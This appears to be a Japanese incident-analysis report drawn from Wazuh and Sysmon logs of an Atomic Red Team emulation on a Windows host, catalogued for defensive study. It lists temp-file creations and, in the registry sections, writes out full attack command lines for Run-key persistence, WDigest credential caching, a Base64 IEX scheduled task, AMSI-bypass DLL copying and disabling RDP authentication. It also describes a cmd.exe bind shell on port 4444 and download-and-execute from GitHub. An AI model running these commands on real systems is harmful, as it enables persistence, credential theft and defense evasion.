+• C:\Windows\SystemTemp__PSScriptPolicyTest_qsi4j2ku.g4g.ps1
+    ◦ 作成UTCタイムスタンプ: 2025-08-20 03:24:03.788
+• C:\Windows\SystemTemp__PSScriptPolicyTest_nmlop5zw.eo3.ps1
+    ◦ 作成UTCタイムスタンプ: 2025-08-20 03:24:58.807
+• C:\Windows\SystemTemp__PSScriptPolicyTest_xmczd0sq.da4.ps1
+    ◦ 作成UTCタイムスタンプ: 2025-08-20 03:26:38.820
+• C:\Windows\SystemTemp__PSScriptPolicyTest_sso05ihv.ilz.ps1
+    ◦ 作成UTCタイムスタンプ: 2025-08-20 03:27:42.853
+• C:\Windows\SystemTemp__PSScriptPolicyTest_202e5j0l.url.ps1
+    ◦ 作成UTCタイムスタンプ: 2025-08-20 04:27:43.925
+• C:\Windows\SystemTemp__PSScriptPolicyTest_p4muzsfp.ixi.ps1
+    ◦ 作成UTCタイムスタンプ: 2025-08-20 03:28:41.864
+• C:\Windows\SystemTemp__PSScriptPolicyTest_2jdidyrm.w2f.ps1
+    ◦ 作成UTCタイムスタンプ: 2025-08-20 03:29:45.908
+• C:\Windows\SystemTemp__PSScriptPolicyTest_fcen1ucr.bbe.ps1
+    ◦ 作成UTCタイムスタンプ: 2025-08-20 03:30:21.902
+• C:\Windows\SystemTemp__PSScriptPolicyTest_w3piecxf.sul.ps1
+    ◦ 作成UTCタイムスタンプ: 2025-08-20 03:30:58.922
+• C:\Windows\SystemTemp__PSScriptPolicyTest_hc4x1cqw.1a0.ps1
+    ◦ 作成UTCタイムスタンプ: 2025-08-20 03:33:01.971
+• C:\Windows\SystemTemp__PSScriptPolicyTest_1edqfnag.nqj.ps1
+    ◦ 作成UTCタイムスタンプ: 2025-08-20 03:33:02.623
+• C:\Windows\SystemTemp__PSScriptPolicyTest_jadookoe.jk3.ps1
+    ◦ 作成UTCタイムスタンプ: 2025-08-20 03:34:41.028
+• C:\Windows\SystemTemp__PSScriptPolicyTest_ic5mujdm.ir1.ps1
+    ◦ 作成UTCタイムスタンプ: 2025-08-20 03:35:25.046
+• C:\Windows\SystemTemp__PSScriptPolicyTest_25hbzt45.21i.ps1
+    ◦ 作成UTCタイムスタンプ: 2025-08-20 03:36:57.082
+• C:\Windows\SystemTemp__PSScriptPolicyTest_svtrrcgp.lvz.ps1
+    ◦ 作成UTCタイムスタンプ: 2025-08-20 03:36:57.776
+• C:\Windows\SystemTemp__PSScriptPolicyTest_d5arioqo.myy.ps1
+    ◦ 作成UTCタイムスタンプ: 2025-08-20 03:37:58.073
+• C:\Windows\SystemTemp__PSScriptPolicyTest_w21c50na.tft.ps1
+    ◦ 作成UTCタイムスタンプ: 2025-08-20 03:37:58.658
+• C:\Windows\SystemTemp__PSScriptPolicyTest_qgz15dbe.fbf.ps1
+    ◦ 作成UTCタイムスタンプ: 2025-08-20 03:39:41.126
+• C:\Windows\SystemTemp__PSScriptPolicyTest_nyp5ykpc.bei.ps1
+    ◦ 作成UTCタイムスタンプ: 2025-08-20 03:39:41.679
+• C:\Windows\SystemTemp__PSScriptPolicyTest_h2r114be.rs1.ps1
+    ◦ 作成UTCタイムスタンプ: 2025-08-20 03:39:44.691
+• C:\Windows\SystemTemp__PSScriptPolicyTest_5xwp2u11.0en.ps1
+    ◦ 作成UTCタイムスタンプ: 2025-08-20 03:39:45.135
+• C:\Windows\SystemTemp__PSScriptPolicyTest_kdlgxlhy.waz.ps1
+    ◦ 作成UTCタイムスタンプ: 2025-08-20 03:40:24.145
+• C:\Windows\SystemTemp__PSScriptPolicyTest_41uonoh4.e3q.ps1
+    ◦ 作成UTCタイムスタンプ: 2025-08-20 03:41:05.199
+• C:\Windows\SystemTemp__PSScriptPolicyTest_dvjaltl0.owa.ps1
+    ◦ 作成UTCタイムスタンプ: 2025-08-20 03:48:30.983
+• C:\Windows\SystemTemp__PSScriptPolicyTest_thg42q3p.czy.ps1
+    ◦ 作成UTCタイムスタンプ: 2025-08-20 03:49:11.978
+• C:\Windows\SystemTemp__PSScriptPolicyTest_15ysracj.pbl.ps1
+    ◦ 作成UTCタイムスタンプ: 2025-08-20 03:49:47.996
+• C:\Windows\SystemTemp__PSScriptPolicyTest_sjja2j3e.dxy.ps1
+    ◦ 作成UTCタイムスタンプ: 2025-08-20 03:51:41.054
+• C:\Windows\SystemTemp__PSScriptPolicyTest_mwi1xypd.kkr.ps1
+    ◦ 作成UTCタイムスタンプ: 2025-08-20 03:54:37.130
+• C:\Windows\SystemTemp__PSScriptPolicyTest_hb2npb53.ckf.ps1
+    ◦ 作成UTCタイムスタンプ: 2025-08-20 03:55:39.152
+• C:\Windows\SystemTemp__PSScriptPolicyTest_zj4w2zks.lf3.ps1
+    ◦ 作成UTCタイムスタンプ: 2025-08-20 03:56:17.157
+• C:\Windows\SystemTemp__PSScriptPolicyTest_nmwthrko.3wo.ps1
+    ◦ 作成UTCタイムスタンプ: 2025-08-20 03:57:03.185
+• C:\Windows\SystemTemp__PSScriptPolicyTest_lzypyx21.tpv.ps1
+    ◦ 作成UTCタイムスタンプ: 2025-08-20 03:57:52.209
+• C:\Windows\SystemTemp__PSScriptPolicyTest_iv2oxh5o.uz1.ps1
+    ◦ 作成UTCタイムスタンプ: 2025-08-20 04:00:18.279
+• C:\Windows\SystemTemp__PSScriptPolicyTest_re0k53jd.aye.ps1
+    ◦ 作成UTCタイムスタンプ: 2025-08-20 04:06:30.389
+• C:\Windows\SystemTemp__PSScriptPolicyTest_crjxs0q0.wvd.ps1
+    ◦ 作成UTCタイムスタンプ: 2025-08-20 04:07:16.420
+• C:\Windows\SystemTemp__PSScriptPolicyTest_lpf2cjjk.0ny.ps1
+    ◦ 作成UTCタイムスタンプ: 2025-08-20 04:09:13.456
+• C:\Windows\SystemTemp__PSScriptPolicyTest_0cjq0r2w.aik.ps1
+    ◦ 作成UTCタイムスタンプ: 2025-08-20 04:22:11.766
+• C:\Windows\SystemTemp__PSScriptPolicyTest_mzwakmpe.ass.ps1
+    ◦ 作成UTCタイムスタンプ: 2025-08-20 04:29:10.888
+• C:\Windows\SystemTemp__PSScriptPolicyTest_xk0alxxq.c3m.ps1
+    ◦ 作成UTCタイムスタンプ: 2025-08-20 04:32:36.983
+• C:\Windows\SystemTemp__PSScriptPolicyTest_shhs1i4b.x3s.ps1
+    ◦ 作成UTCタイムスタンプ: 2025-08-20 04:33:35.050
+• C:\Windows\SystemTemp__PSScriptPolicyTest_bnwwpte1.fva.ps1
+    ◦ 作成UTCタイムスタンプ: 2025-08-20 04:34:36.073
+• C:\Windows\SystemTemp__PSScriptPolicyTest_coeje5ve.1rp.ps1
+    ◦ 作成UTCタイムスタンプ: 2025-08-20 04:36:00.115
+• C:\Windows\SystemTemp__PSScriptPolicyTest_vwpe2vtp.kry.ps1
+    ◦ 作成UTCタイムスタンプ: 2025-08-20 05:21:40.052
+• C:\Windows\SystemTemp__PSScriptPolicyTest_3cfpxnrg.hcp.ps1
+    ◦ 作成UTCタイムスタンプ: 2025-08-20 05:27:08.139
+• C:\Windows\SystemTemp__PSScriptPolicyTest_heqsryuu.vg4.ps1
+    ◦ 作成UTCタイムスタンプ: 2025-08-20 05:28:47.201
+• C:\Windows\SystemTemp__PSScriptPolicyTest_22agn1mo.rzn.ps1
+    ◦ 作成UTCタイムスタンプ: 2025-08-20 05:30:04.981
+• C:\Windows\SystemTemp__PSScriptPolicyTest_3mlplchp.xug.ps1
+    ◦ 作成UTCタイムスタンプ: 2025-08-20 05:30:53.331
+• C:\Windows\SystemTemp__PSScriptPolicyTest_bkoo5k5j.zmu.ps1
+    ◦ 作成UTCタイムスタンプ: 2025-08-20 05:31:56.703
+• C:\Windows\SystemTemp__PSScriptPolicyTest_ri4xn02h.bxm.ps1
+    ◦ 作成UTCタイムスタンプ: 2025-08-20 05:34:46.422
+• C:\Windows\SystemTemp__PSScriptPolicyTest_mvmuyff3.rch.ps1
+    ◦ 作成UTCタイムスタンプ: 2025-08-20 05:38:44.853
+• C:\Windows\SystemTemp__PSScriptPolicyTest_xdstswa0.rbp.ps1
+    ◦ 作成UTCタイムスタンプ: 2025-08-20 05:40:13.099
+• C:\Windows\SystemTemp__PSScriptPolicyTest_wtyozfzi.xoq.ps1
+    ◦ 作成UTCタイムスタンプ: 2025-08-20 05:41:22.368
+• C:\Windows\SystemTemp__PSScriptPolicyTest_knf25kdk.nlb.ps1
+    ◦ 作成UTCタイムスタンプ: 2025-08-20 05:42:12.217
+• C:\Windows\SystemTemp__PSScriptPolicyTest_z5smoovo.2w3.ps1
+    ◦ 作成UTCタイムスタンプ: 2025-08-20 05:42:56.123
+• C:\Windows\SystemTemp__PSScriptPolicyTest_lpmv4ert.vi0.ps1
+    ◦ 作成UTCタイムスタンプ: 2025-08-20 05:44:18.903
+• C:\Windows\SystemTemp__PSScriptPolicyTest_qiqbid2w.isa.ps1
+    ◦ 作成UTCタイムスタンプ: 2025-08-20 05:45:09.731
+• C:\Windows\SystemTemp__PSScriptPolicyTest_zno2ngoa.gcb.ps1
+    ◦ 作成UTCタイムスタンプ: 2025-08-20 05:46:57.761
+• C:\Windows\SystemTemp__PSScriptPolicyTest_y0p5jxdd.txj.ps1
+    ◦ 作成UTCタイムスタンプ: 2025-08-20 05:48:33.871
+• C:\Windows\SystemTemp__PSScriptPolicyTest_rq5azj1h.whs.ps1
+    ◦ 作成UTCタイムスタンプ: 2025-08-20 05:50:28.595
+• C:\Windows\SystemTemp__PSScriptPolicyTest_tlqvgnay.hz5.ps1
+    ◦ 作成UTCタイムスタンプ: 2025-08-20 05:51:39.130
+• C:\Windows\SystemTemp__PSScriptPolicyTest_bjg4jic5.qmq.ps1
+    ◦ 作成UTCタイムスタンプ: 2025-08-20 05:52:24.335
+• C:\Windows\SystemTemp__PSScriptPolicyTest_ymfwingd.qsa.ps1
+    ◦ 作成UTCタイムスタンプ: 2025-08-20 05:53:29.240
+• C:\Windows\SystemTemp__PSScriptPolicyTest_io5mmno0.jeo.ps1
+    ◦ 作成UTCタイムスタンプ: 2025-08-20 05:58:11.018
+• C:\Windows\SystemTemp__PSScriptPolicyTest_m1bg0j5m.wi2.ps1
+    ◦ 作成UTCタイムスタンプ: 2025-08-20 06:00:37.822
+• C:\Windows\SystemTemp__PSScriptPolicyTest_zmhvdngn.xu3.ps1
+    ◦ 作成UTCタイムスタンプ: 2025-08-20 06:02:15.414
+• C:\Windows\SystemTemp__PSScriptPolicyTest_pwnqen1w.3fy.ps1
+    ◦ 作成UTCタイムスタンプ: 2025-08-20 06:03:18.519
+• C:\Windows\SystemTemp__PSScriptPolicyTest_1eezr05x.juq.ps1
+    ◦ 作成UTCタイムスタンプ: 2025-08-20 06:07:35.278
+• C:\Windows\SystemTemp__PSScriptPolicyTest_fi4arkom.fv1.ps1
+    ◦ 作成UTCタイムスタンプ: 2025-08-20 14:41:57.479
+
+
+レジストリキーに関する網羅的な調査結果
+現在までに確認されたレジストリキーの操作は以下の通りです。これらの操作は、ファイルの表示設定、システムの永続化、認証情報のダンプ、アプリケーションの動作変更、およびリモートデスクトップ設定の変更に関連する可能性があります。
+明示的なコマンドで確認されたレジストリキー
+以下のレジストリキーは、提供された「critical severity元データ.txt」および「high severity元データ.txt」内で、reg addコマンドによって具体的なパスと値の操作が明確に記録されています。
+• HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced
+    ◦ コマンド: cmd.exe /C reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /t REG_DWORD /v HideFileExt /d 1 /f
+    ◦ アクション: レジストリ値の追加/変更
+    ◦ 値の名前: HideFileExt
+    ◦ 値のタイプ: REG_DWORD
+    ◦ データ: 1
+    ◦ 説明: ファイル拡張子を非表示にする設定が行われました。これは、悪意のあるファイル拡張子を隠すためによく使用される手法である可能性があります。
+• HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
+    ◦ コマンド: cmd.exe /C reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /t REG_EXPAND_SZ /v SecurityHealth /d calc.exe /f
+    ◦ アクション: レジストリ値の追加/変更
+    ◦ 値の名前: SecurityHealth
+    ◦ 値のタイプ: REG_EXPAND_SZ
+    ◦ データ: calc.exe
+    ◦ 説明: システム起動時に calc.exe を実行するように設定されました。これは、永続化の手法として悪用されることがあります。
+• HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest
+    ◦ コマンド: cmd.exe /C reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
+    ◦ アクション: レジストリ値の追加/変更
+    ◦ 値の名前: UseLogonCredential
+    ◦ 値のタイプ: REG_DWORD
+    ◦ データ: 1
+    ◦ 説明: WDigest認証プロバイダーによるログオン資格情報のキャッシュを有効にする設定が行われました。これは、攻撃者が資格情報をダンプするために利用される可能性があります。
+• HKCU\SOFTWARE\ATOMIC-T1053.005
+    ◦ コマンド: cmd.exe /C reg add HKCU\SOFTWARE\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyAxMjcuMC4wLjE= /f && schtasks.exe /Create /F /TN ""ATOMIC-T1053.005"" /TR ""cmd /c start /min \""\"" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\\\SOFTWARE\\\\ATOMIC-T1053.005).test)))"" /sc daily /st 07:45
+    ◦ アクション: レジストリ値の追加/変更
+    ◦ 値の名前: test
+    ◦ 値のタイプ: REG_SZ
+    ◦ データ: cGluZyAxMjcuMC4wLjE= (Base64エンコードされた文字列で、デコードすると ping 127.0.0.1 となります)
+    ◦ 説明: このレジストリ値は、Base64エンコードされたコマンドを格納するために使用され、その後スケジュールされたタスクによって実行されます。これは、難読化ファイルや情報、レジストリの変更といった防御回避のテクニックに分類されます。
+会話履歴で確認されたレジストリキー（現在のソースには明示されていないもの）
+前回の会話で提供した包括的なリストには、現在の「NEW SOURCE」ブロックに直接含まれていないものの、過去のソースまたは文脈から導き出された以下のレジストリキー操作が含まれていました。これらは引き続き会話履歴の一部として考慮されます。
+• HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+    ◦ コマンド: cmd.exe /C REG ADD ""HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" /V ""Atomic Red Team"" /t REG_SZ /F /D ""C:\Path\AtomicRedTeam.exe""
+    ◦ アクション: レジストリ値の追加/変更
+    ◦ 値の名前: Atomic Red Team
+    ◦ 値のタイプ: REG_SZ
+    ◦ データ: C:\Path\AtomicRedTeam.exe
+    ◦ 説明: ユーザーのログオン時に C:\Path\AtomicRedTeam.exe を実行するように設定された可能性があります。これは、永続化の手法として利用されます。
+• HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend
+    ◦ コマンド: cmd.exe /C REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d ""C:\Path\AtomicRedTeam.dll""
+    ◦ アクション: レジストリ値の追加/変更
+    ◦ 値の名前: 1
+    ◦ データ: C:\Path\AtomicRedTeam.dll
+    ◦ 説明: システム起動時に一度だけ実行されるようにDLLが設定された可能性があります。これは、永続化の手法として利用されます。
+• HKCR\CLSID{645FF040-5081-101B-9F08-00AA002F954E}\shell\open\command
+    ◦ コマンド: cmd.exe /C reg ADD ""HKCR\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell\open\command"" /ve /d ""calc.exe"" /f
+    ◦ アクション: レジストリ値の追加/変更
+    ◦ 値の名前: (Default) (/ve で示唆)
+    ◦ データ: calc.exe
+    ◦ 説明: 特定のCLSID（例：ごみ箱）の「開く」コマンドが calc.exe に変更された可能性があります。これは、アプリケーションの実行ハイジャックまたは永続化の試みである可能性があります。
+• HKEY_CURRENT_USER\Environment
+    ◦ コマンド: cmd.exe /C copy %windir%\System32\amsi.dll %APPDATA%\amsi.dll && ren %APPDATA%\amsi.dll WinAppXRT.dll && copy %APPDATA%\WinAppXRT.dll %windir%\System32\WinAppXRT.dll && reg add ""HKEY_CURRENT_USER\Environment"" /v APPX_PROCESS /t REG_EXPAND_SZ /d ""1"" /f
+    ◦ アクション: レジストリ値の追加/変更
+    ◦ 値の名前: APPX_PROCESS
+    ◦ 値のタイプ: REG_EXPAND_SZ
+    ◦ データ: 1
+    ◦ 説明: 環境変数 APPX_PROCESS が設定された可能性があります。これは、AMSI（Antimalware Scan Interface）バイパスのような防御回避のテクニックと関連している可能性があります。
+• HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp
+    ◦ コマンド: cmd.exe /C reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"" /v UserAuthentication /d 0 /t REG_DWORD /f
+    ◦ アクション: レジストリ値の追加/変更
+    ◦ 値の名前: UserAuthentication
+    ◦ 値のタイプ: REG_DWORD
+    ◦ データ: 0
+    ◦ 説明: リモートデスクトップのユーザー認証設定が 0 に変更された可能性があります。これは、ネットワークレベル認証 (NLA) を無効にし、ブルートフォース攻撃を容易にするために利用される可能性があります。
+特定のパスが不明なレジストリ操作
+「high severity元データ.txt」内では、以下のSysmonログエントリが reg.exe によるレジストリ値の追加を示唆していますが、そのコマンドラインやレジストリキーの具体的なパスは提供されている抜粋からは特定できません。
+• "Value added to registry key has Base64-like pattern" という説明が複数回記録されています。これは reg.exe プロセスがBase64パターンを含む値をレジストリに追加したことを示しますが、どのレジストリキーに対して行われたかは、このログの範囲では特定できません。
+
+
+
+
+設定変更に関する網羅的な調査結果
+現在までに確認されたシステム設定への変更は、主にレジストリ操作を通じて行われています。これらの操作は、ファイルの表示設定、システムの永続化、認証情報の収集、アプリケーションの動作変更、およびリモートデスクトップ設定の変更に関連する可能性があります。
+明示的なコマンドで確認されたレジストリキーの変更
+以下のレジストリキーは、提供されたソース内で、reg addコマンドによって具体的なパスと値の操作が明確に記録されています。
+• HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced
+    ◦ 変更された値の名前: HideFileExt
+    ◦ 値のタイプ: REG_DWORD
+    ◦ 設定されたデータ: 1
+    ◦ 説明: ファイル拡張子を非表示にする設定が行われました。これは、悪意のあるファイル拡張子を隠すためによく使用される可能性があります。
+• HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
+    ◦ 変更された値の名前: SecurityHealth
+    ◦ 値のタイプ: REG_EXPAND_SZ
+    ◦ 設定されたデータ: calc.exe
+    ◦ 説明: システム起動時に calc.exe を実行するように設定されました。これは、永続化の手法として悪用されることがあります。
+• HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest
+    ◦ 変更された値の名前: UseLogonCredential
+    ◦ 値のタイプ: REG_DWORD
+    ◦ 設定されたデータ: 1
+    ◦ 説明: WDigest認証プロバイダーによるログオン資格情報のキャッシュを有効にする設定が行われました。これは、攻撃者が資格情報をダンプするために利用される可能性があります。
+• HKCU\SOFTWARE\ATOMIC-T1053.005
+    ◦ 変更された値の名前: test
+    ◦ 値のタイプ: REG_SZ
+    ◦ 設定されたデータ: cGluZyAxMjcuMC4wLjE=
+    ◦ 説明: このレジストリ値には、Base64エンコードされた文字列（デコードすると ping 127.0.0.1 となります）が格納されました。この値は、その後スケジュールされたタスクによって実行されるコマンドの一部として使用され、難読化や防御回避のテクニックに分類されます。
+• HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+    ◦ 変更された値の名前: Atomic Red Team
+    ◦ 値のタイプ: REG_SZ
+    ◦ 設定されたデータ: C:\Path\AtomicRedTeam.exe
+    ◦ 説明: ユーザーのログオン時に C:\Path\AtomicRedTeam.exe を実行するように設定された可能性があります。これは、永続化の手法として利用されます。
+• HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend
+    ◦ 変更された値の名前: 1
+    ◦ 値のタイプ: (ソースに明示的なタイプ指定なし。通常はREG_SZまたはREG_EXPAND_SZと推測されます)
+    ◦ 設定されたデータ: C:\Path\AtomicRedTeam.dll
+    ◦ 説明: システム起動時に一度だけ実行されるようにDLLが設定された可能性があります。これは、永続化の手法として利用されます。
+• HKCR\CLSID{645FF040-5081-101B-9F08-00AA002F954E}\shell\open\command
+    ◦ 変更された値の名前: (Default) (コマンドラインの/veオプションにより示唆)
+    ◦ 値のタイプ: (ソースに明示的なタイプ指定なし。通常はREG_SZまたはREG_EXPAND_SZと推測されます)
+    ◦ 設定されたデータ: calc.exe
+    ◦ 説明: 特定のCLSID（ごみ箱のCLSIDに相当）の「開く」コマンドが calc.exe に変更された可能性があります。これは、アプリケーションの実行ハイジャックまたは永続化の試みである可能性があります。
+• HKEY_CURRENT_USER\Environment
+    ◦ 変更された値の名前: APPX_PROCESS
+    ◦ 値のタイプ: REG_EXPAND_SZ
+    ◦ 設定されたデータ: 1
+    ◦ 説明: 環境変数 APPX_PROCESS が設定されました。この操作は、AMSI（Antimalware Scan Interface）バイパスのような防御回避のテクニックと関連している可能性があります。
+• HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp
+    ◦ 変更された値の名前: UserAuthentication
+    ◦ 値のタイプ: REG_DWORD
+    ◦ 設定されたデータ: 0
+    ◦ 説明: リモートデスクトップのユーザー認証設定が 0 に変更されました。これは、ネットワークレベル認証 (NLA) を無効にし、ブルートフォース攻撃を容易にするために利用される可能性があります。
+その他の情報（具体的なレジストリパス不明）
+• 「high severity元データ.txt」および「normal severity元データ.txt」には、reg.exeプロセスがBase64パターンを含む値をレジストリに追加したことを示す複数のSysmonログエントリが存在しますが、具体的なレジストリキーのパスは、提供されたログ抜粋からは直接特定できません。ただし、上記の詳細なレジストリ操作は、これらのアラートに付随するものであり、その実行コマンドラインから具体的なパスを特定しています。
+• PowerShellスクリプト内で大量のBase64エンコードされた文字列（PEファイルやスクリプトの一部と見られる）が確認されており、これはコマンド実行の難読化やメモリ上での実行を目的としている可能性がありますが、これ自体が直接的な永続的な設定変更ではありません。
+
+ネットワークインジケータ（内部通信）に関する網羅的な調査結果
+システム内で確認された内部ネットワーク関連の活動は、主に以下のカテゴリに分類されます。
+1. 明示的なループバックアドレスへの疎通確認
+• ping 127.0.0.1 の実行:
+    ◦ レジストリキー HKCU\SOFTWARE\ATOMIC-T1053.005 の test 値にBase64エンコードされた文字列 cGluZyAxMjcuMC4wLjE= が格納されました。このBase64文字列はデコードすると ping 127.0.0.1 となります。
+    ◦ この値は、その後、スケジュールされたタスク ATOMIC-T1053.005 によって毎日午前7時45分に実行されるコマンドの一部として利用されました。
+    ◦ これは、システム自身のループバックアドレスへの疎通確認を目的としています。
+2. 内部リバースシェル機能の確立
+複数のPowerShellスクリプト（Base64エンコードされたものを含む）の分析により、以下の内部通信機能が確認されています。これらのスクリプトは、システム内部でのコマンド＆コントロール (C2) チャネルの確立を試みています。
+• TCPリスナーの起動:
+    ◦ スクリプト内で _bind 関数が定義されており、引数としてIPアドレスとポートを受け取ります.
+    ◦ 具体的には、BackdoorServer.Backdoor::_bind("127.0.0.1", "4444") という形で、ループバックアドレス 127.0.0.1 のポート 4444 でTCPリスナーを起動するよう設定されています.
+    ◦ TcpListener クラスが使用され、指定されたIPアドレスとポートで接続をリッスンし、AcceptSocket() メソッドでクライアントからの接続を受け入れる機能が含まれています.
+• ネットワークストリームを介したデータ送受信:
+    ◦ 確立されたソケット接続 (mainSocket) を介して、NetworkStream クラスが使用されています.
+    ◦ これにより、シェルコマンドの入力 (getInput 関数など) およびその出力がネットワーク上で送受信されることが可能になります.
+    ◦ StreamReader (inStream) と StreamWriter (outStream) がネットワークストリームに結びつけられ、データの読み書きが行われます.
+    ◦ コマンドプロンプト (cmd.exe) の標準入出力 (StandardInput, StandardOutput, StandardError) は、このネットワークストリームにリダイレクトされるように設定されています.
+• 接続の終了処理:
+    ◦ dropConnection() 関数は、シェルセッションが終了するかエラーが発生した場合に、ソケットのクローズ (mainSocket.Close()) およびリスナーの停止 (listener.Stop()) を含むクリーンアップ処理を実行します.
+
+
+ネットワークインジケータ（外部通信）に関する追加調査結果
+新たに提供されたソースを再評価した結果、以下の外部ネットワーク活動が確認されました。
+1. 特定のURLからのPowershellスクリプトおよびExcelファイルのダウンロードと実行
+• https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1566.001/bin/PhishingAttachment.xlsm へのアクセス:
+    ◦ powershell.exe を通じて、このURLから PhishingAttachment.xlsm というファイルがダウンロードされ、一時ディレクトリ ($env:TEMP\PhishingAttachment.xlsm) に保存されました。
+    ◦ この通信は、Invoke-WebRequest コマンドレットを使用し、Tls12 (TLS 1.2) プロトコルを指定して行われました。
+    ◦ これは、T1566.001 (Phishing: Spearphishing Attachment) に関連するツールの外部からの転送を明確に示す、重要な外部ネットワークインジケータです。
+• https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1 へのアクセス:
+    ◦ powershell.exe を通じて、このURLからスクリプトがダウンロードされ、実行されました。この通信は、IEX (Invoke-Expression) と iwr (Invoke-WebRequest) コマンドレットを使用し、Tls12 プロトコルを指定して行われました。
+    ◦ このスクリプトは、その後、ping 8.8.8.8 コマンドの実行や、別のJavaScriptファイルの実行 (cscript.exe C:\\Users\\Public\\art.jse または wscript.exe //E:jscript C:\\Users\\Public\\art.jse) を伴っています。
+2. PowerShellによる外部からのツールの転送を示唆するファイル作成（Ingress Tool Transfer）
+• C:\Windows\SystemTemp\ および C:\Windows\Temp\ ディレクトリへのファイル作成:
+    ◦ 多数のSysmonイベント（Event ID 11）が記録されており、C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe または C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe プロセスが、C:\Windows\SystemTemp\ ディレクトリ（例: __PSScriptPolicyTest_*.ps1 ファイル）や C:\Windows\Temp\ ディレクトリ（例: PotentiallyUnwanted.exe, KeyScrambler_Setup.exe, a.exe, xordump.exe）に複数のファイルを生成しました。
+    ◦ これらのファイル作成イベントには、Wazuhアラートの分類において "Ingress Tool Transfer" (T1105) のタクティクスとテクニックが関連付けられています。これは、外部からツールやスクリプトがシステムに転送されたことを示唆しています。
+    ◦ 特に、PotentiallyUnwanted.exe、KeyScrambler_Setup.exe、a.exe、xordump.exe といった実行可能ファイルが C:\Windows\Temp\ に作成されたことが記録されています。
+    ◦ DLLファイルも C:\Windows\SystemTemp\fgfgtfav\fgfgtfav.dll, C:\Windows\SystemTemp\51yz0cew\51yz0cew.dll, C:\Windows\SystemTemp\bbrrtwa2\bbrrtwa2.dll, C:\Windows\SystemTemp\v1slex2h\v1slex2h.dll など、一時ディレクトリのサブフォルダに作成されています。
+3. Powershellスクリプト内のリモートコマンド実行機能（外部から転送されたスクリプトに内包）
+• Invoke-Command の使用:
+    ◦ Base64エンコードされたPowerShellスクリプトには、Invoke-Command コマンドレットの使用が確認できます。このコマンドは、ComputerName パラメータが指定されていない場合、現在のシステム上でスクリプトブロック ($RemoteScriptBlock) を実行し、ComputerName が指定されている場合はリモートホストに対して実行するロジックが含まれています。
+    ◦ このスクリプトは外部からダウンロードされたものとみられるため、その機能が外部システムとの通信や制御を目的としている可能性があります。
+4. 外部IPアドレスへのPingコマンドによる疎通確認
+• IPアドレス 8.8.8.8: powershell.exe の実行によって ping 8.8.8.8 コマンドが実行されました。これは外部へのネットワーク疎通確認またはデータ収集の試みである可能性があります。
+
+
+ポートに関する事実のみの調査結果
+システム上で確認されたネットワーク関連の活動、およびポートに関する事実は以下の通りです。
+ネットワークインジケータ
+外部通信
+• URL: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1
+    ◦ Powershellスクリプトのダウンロード元として使用されました。この通信はTLS 1.2プロトコル経由で行われましたが、具体的なポート番号（例: 443）はソースに明示されていません。
+• URL: https://download.qfxsoftware.com/download/latest/KeyScrambler_Setup.exe
+    ◦ KeyScrambler_Setup.exeのダウンロード元として使用されました。
+• IP: 8.8.8.8
+    ◦ powershell.exeの実行によってping 8.8.8.8コマンドが実行され、疎通確認に使用されました。pingコマンドはICMPプロトコルを使用するため、TCPやUDPのポートを直接利用するものではありません。
+• IP: 10.0.8.149
+    ◦ Wazuhアラートの警告元として記録されたWindowsPCのIPアドレスです。
+• IP: 10.0.8.118
+    ◦ Wazuhアラートの警告元として記録されたActiveDirectoryのIPアドレスです。
+• IP: 10.0.0.212
+    ◦ WazuhLinuxAgentのIPアドレスとして、netstatのリスニングポート情報に関連して確認されています（過去のソースより）。
+• ネットワークを介して悪用されうる脆弱性: Windows Server 2022 Datacenter上でWazuhによって複数の高深刻度CVE（例: CVE-2025-47981、CVE-2025-49716、CVE-2025-47998、CVE-2025-49666、CVE-2025-49729、CVE-2025-47972、CVE-2025-48814など）が検出されています。これらの多くは攻撃元が「NETWORK」または「ADJACENT_NETWORK」であると評価されていますが、関連する具体的なポート番号はソースには記載されていません。
+内部通信
+• IP: 127.0.0.1
+    ◦ Base64デコードされたPowerShellスクリプト内にTcpListenerが**4444番ポートでリッスンする機能が明示的に含まれており**、C2通信に使用された可能性があります。また、レジストリに追加されたBase64エンコードされたコマンドラインをデコードすると、ping 127.0.0.1が含まれており、疎通確認にも使用されました。
+• アカウント: DOMAIN\user
+    ◦ スケジュールされたタスク作成時に使用されたコマンドラインにこのアカウントが含まれていたと、これまでの会話履歴から確認されています。
+• アカウント: NT AUTHORITY\SYSTEM
+    ◦ 多くのSysmonイベントにおいて、プロセス実行やファイル作成のユーザーとして記録されています。
